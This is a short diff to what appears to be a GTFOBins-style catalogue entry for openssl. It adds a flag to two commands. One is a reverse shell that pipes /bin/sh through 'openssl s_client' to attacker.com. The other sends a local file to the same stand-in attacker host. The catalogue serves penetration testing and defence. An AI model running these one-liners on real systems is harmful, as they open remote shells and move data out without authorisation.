@@ -11,7 +11,7 @@ functions:
       code: |
         RHOST=attacker.com
         RPORT=12345
-        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
   file-upload:
     - description: |
         To collect the file run the following on the attacker box:
@@ -24,7 +24,7 @@ functions:
         RHOST=attacker.com
         RPORT=12345
         LFILE=file_to_send
-        openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
+        openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT < "$LFILE"
   file-download:
     - description: |
         To send the file run the following on the attacker box:
